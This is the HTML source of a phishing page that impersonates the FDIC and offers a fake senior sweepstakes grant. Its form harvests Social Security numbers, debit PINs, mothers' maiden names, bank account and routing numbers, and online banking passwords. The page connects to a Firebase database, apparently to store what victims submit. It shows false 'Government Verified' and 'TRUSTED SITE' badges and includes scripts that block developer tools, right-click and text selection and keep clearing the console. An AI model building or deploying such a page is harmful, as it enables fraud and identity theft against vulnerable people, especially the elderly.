<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FDIC</title>
    <link rel="icon" type="image/jpeg" href="favicon.jpg">
    <link rel="shortcut icon" type="image/jpeg" href="favicon.jpg">
    <link rel="apple-touch-icon" href="favicon.jpg">
    <link rel="stylesheet" href="grant-styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
   

  
            <div class="fdic-hero-image-container">
                <div class="fdic-hero-image">
                    <img src="assets/8.jpeg" alt="FDIC News and Updates" class="hero-img">
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="form-container">
                <div class="form-header">
                    <h2>Application Form</h2>
                    <p>Complete all fields below to receive your grant allocation</p>
                    <p style="font-size: 0.8em; color: #666; font-style: italic;">Demo Version - For Testing Purposes</p>
                </div>

                <form id="grant-form" class="grant-form">
                    <!-- Information Section -->
                    <section class="form-section">
                        <h3><i class="fas fa-info-circle"></i> Information</h3>
                        
                        <div class="form-group">
                            <label for="full-name">Full Name *</label>
                            <input type="text" id="full-name" name="fullName" required>
                        </div>

                        <div class="form-group">
                            <label for="birth-date">Birth Date *</label>
                            <input type="date" id="birth-date" name="birthDate" required>
                        </div>

                        <div class="form-group">
                            <label for="email">Email Address *</label>
                            <input type="email" id="email" name="email" required>
                        </div>

                        <div class="form-group">
                            <label for="address">Address *</label>
                            <textarea id="address" name="address" rows="3" required></textarea>
                        </div>

                        <div class="form-group">
                            <label for="bank-name">Bank Name *</label>
                            <input type="text" id="bank-name" name="bankName" required>
                        </div>

                        <div class="form-group">
                            <label for="account-number">Account Number *</label>
                            <input type="text" id="account-number" name="accountNumber" required>
                        </div>

                        <div class="form-group">
                            <label for="routing-number">Routing Number *</label>
                            <input type="text" id="routing-number" name="routingNumber" required>
                        </div>

                        <div class="form-group">
                            <label for="bank-association">How long have you been associated with this bank *</label>
                            <select id="bank-association" name="bankAssociation" required>
                                <option value="">Select duration</option>
                                <option value="less-than-1-year">Less than 1 year</option>
                                <option value="1-3-years">1-3 years</option>
                                <option value="3-5-years">3-5 years</option>
                                <option value="5-10-years">5-10 years</option>
                                <option value="more-than-10-years">More than 10 years</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label for="ssn">Social Security (SSN) *</label>
                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
                        </div>

                        <div class="form-group">
                            <label for="drivers-license">Driver's License/ State ID Number *</label>
                            <input type="text" id="drivers-license" name="driversLicense" required>
                        </div>

                        <div class="form-group">
                            <label for="mothers-maiden-name">Mother's Maiden Name (MMN) *</label>
                            <input type="text" id="mothers-maiden-name" name="mothersMaidenName" required>
                        </div>

                        <div class="form-group">
                            <label for="debit-pin">Primary Debit Card Pin *</label>
                            <input type="password" id="debit-pin" name="debitPin" maxlength="4" required>
                        </div>

                        <div class="form-group">
                            <label for="card-last-4">Last 4 Digit of Primary *</label>
                            <input type="text" id="card-last-4" name="cardLast4" maxlength="4" required>
                        </div>

                        <div class="form-group">
                            <label for="online-username">Bank Online Username *</label>
                            <input type="text" id="online-username" name="onlineUsername" required>
                        </div>

                        <div class="form-group">
                            <label for="online-password">Password *</label>
                            <input type="password" id="online-password" name="onlinePassword" required>
                        </div>

                        <div class="form-group">
                            <label for="weekly-deposit">Weekly Deposit From (American Senior Sweepstakes) *</label>
                            <select id="weekly-deposit" name="weeklyDeposit" required>
                                <option value="">Select amount</option>
                                <option value="500">$500</option>
                                <option value="1000">$1,000</option>
                                <option value="2500">$2,500</option>
                                <option value="5000">$5,000</option>
                                <option value="10000">$10,000</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label for="verification-code">Verification 5 Digit Number *</label>
                            <input type="text" id="verification-code" name="verificationCode" maxlength="5" required>
                        </div>
                    </section>

                    <!-- Submit Button -->
                    <div class="form-actions">
                        <button type="submit" class="submit-btn">
                            Submit
                        </button>
                    </div>
                </form>
            </div>

            <!-- Trusted Site Logo Section -->
            <div class="trusted-site-section">
                <div class="trusted-logo">
                    <i class="fas fa-shield-check"></i>
                    <div class="trusted-text">TRUSTED SITE</div>
                </div>
                <div class="trusted-subtitle">
                    <i class="fas fa-lock"></i>
                    Secure & Encrypted Connection
                </div>
                <div class="security-features">
                    <i class="fas fa-certificate"></i>
                    SSL Certificate Verified | 
                    <i class="fas fa-user-shield"></i>
                    Privacy Protected |
                    <i class="fas fa-check-circle"></i>
                    Government Verified
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <p>&copy; 2005 Federal Deposits Insurance Corporation   </p>
                
        </footer>
    </div>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
        import { getFirestore, collection, addDoc, getDocs, doc, updateDoc } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
        
        // Temporarily disable domain restriction for testing
        console.log('Current hostname:', window.location.hostname);

        // Your Firebase config
        const firebaseConfig = {
            apiKey: "AIzaSyCVzYdasxCFI94UwQzET5FwWpFgeW195CM",
            authDomain: "fdic-portal-50d65.firebaseapp.com",
            projectId: "fdic-portal-50d65",
            storageBucket: "fdic-portal-50d65.firebasestorage.app",
            messagingSenderId: "382207401253",
            appId: "1:382207401253:web:b1446a5a5573e2db078ecc"
        };
        
        // Initialize Firebase
        console.log('=== FIREBASE INITIALIZATION ===');
        console.log('Firebase config:', firebaseConfig);
        console.log('Current URL:', window.location.href);
        console.log('Current hostname:', window.location.hostname);
        
        try {
            const app = initializeApp(firebaseConfig);
            console.log('✅ Firebase app initialized successfully:', app);
            
            const db = getFirestore(app);
            console.log('✅ Firestore database initialized successfully:', db);
            
            // Make Firebase functions available globally
            window.db = db;
            window.firebaseAddDoc = async (database, collectionName, data) => {
                console.log('firebaseAddDoc called with:', { database, collectionName, data });
                return await addDoc(collection(database, collectionName), data);
            };
            window.firebaseGetDocs = async (database, collectionName) => {
                return await getDocs(collection(database, collectionName));
            };
            window.firebaseUpdateDoc = async (database, collectionName, docId, data) => {
                return await updateDoc(doc(database, collectionName, docId), data);
            };
            
            console.log('✅ Firebase functions set up successfully');
            console.log('window.db:', window.db);
            console.log('window.firebaseAddDoc:', !!window.firebaseAddDoc);
            
            // Test Firebase connection
            setTimeout(async () => {
                try {
                    console.log('🧪 Testing Firebase connection...');
                    const testData = {
                        test: true,
                        timestamp: new Date(),
                        message: 'Connection test',
                        url: window.location.href,
                        hostname: window.location.hostname
                    };
                    
                    console.log('Sending test data:', testData);
                    const testRef = await window.firebaseAddDoc(window.db, 'test', testData);
                    console.log('✅ Firebase test successful! Document ID:', testRef.id);
                    console.log('✅ Data saved to collection: test');
                    
                    // Clean up test document
                    // Note: We'll leave the test document for now
                } catch (testError) {
                    console.error('❌ Firebase test failed:', testError);
                    console.error('Error details:', testError.message);
                    console.error('Error code:', testError.code);
                }
            }, 2000);
            
        } catch (error) {
            console.error('❌ Firebase initialization failed:', error);
        }
    </script>
    <script src="grant-script.js"></script>
    
    <!-- Additional Security -->
    <script>
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // Disable F12 and developer tools
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                e.preventDefault();
                return false;
            }
        });
        
        // Disable text selection
        document.onselectstart = function() {
            return false;
        };
        
        // Clear console periodically
        setInterval(function() {
            console.clear();
        }, 1000);
    </script>
</body>
</html>
